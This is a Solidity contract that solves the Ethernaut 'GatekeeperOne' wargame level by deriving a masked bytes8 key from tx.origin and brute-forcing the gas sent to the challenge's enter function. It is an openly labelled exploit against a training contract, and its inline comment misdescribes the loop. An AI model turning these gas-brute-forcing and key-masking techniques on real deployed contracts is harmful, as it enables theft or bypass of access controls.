// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import {GatekeeperOne} from "../Instances/GateKeeperOne.sol";

contract LetMeThrough {
    GatekeeperOne public gatekeeper = GatekeeperOne(0x039b3C0AF5cE87aF86e10b8269f587B4aD46d2aa);
    
   uint j = uint256(uint160(address(tx.origin)));

    function exploit() external {
        bytes8 key = bytes8(uint64(j)) & 0xFFFFFFFF0000FFFF;
        for(uint256 i =0; i<300 ; i++){
            (bool success,) = address(gatekeeper).call{gas : i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
       //checks gas left after every call and if it is divisible by 8191 then it will call again
            if(success){
                break;
            }
        }
    }
}